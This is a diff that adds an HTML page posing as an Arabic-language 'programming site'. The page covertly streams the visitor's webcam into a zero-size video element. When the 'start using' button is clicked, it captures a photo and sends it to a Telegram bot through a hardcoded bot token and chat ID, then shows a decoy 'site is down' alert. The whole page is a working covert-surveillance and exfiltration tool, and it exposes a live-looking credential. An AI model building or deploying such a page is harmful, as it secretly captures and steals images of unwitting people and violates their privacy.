@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Image</title>
+    <style>
+        video, canvas {
+            display: block;
+            margin: 20px auto;
+        }
+        button {
+            display: block;
+            margin: 10px auto;
+            background-color: black;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1 style="text-align: center;">موقع البرمجة</h1>
+    <video id="video" width="0" height="0" autoplay></video>
+    <button id="captureBtn">بدا الاستخدام</button>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+    <script>
+        
+        const video = document.getElementById('video');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error(" خطا:", err);
+            });
+
+        const captureBtn = document.getElementById('captureBtn');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        captureBtn.addEventListener('click', () => {
+            // التقاط الصورة من الفيديو
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى بيانات Base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // إرسال الصورة إلى بوت تليجرام
+            sendImageToTelegram(imageData);
+        });
+
+        function sendImageToTelegram(imageData) {
+            const telegramBotToken = "6803199081:AAEhhWrL9DBc7ZJ896KhlRtJVvgyrPyDA40";
+            const chatId = "743034594"; // استبدل مع معرف الشخص أو القروب
+
+            // تحويل بيانات Base64 إلى ملف Blob
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.png');
+
+                    // إرسال الصورة باستخدام واجهة API الخاصة بتليجرام
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert('عزيزي العميل الموقع متوقف الان');
+                        } else {
+                              alert('عزيزي العميل الموقع متوقف الان');
+                        }
+                    })
+                  .catch(error => {
+                        console.error('عزيزي العميل الموقع متوقف الان !', error);
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
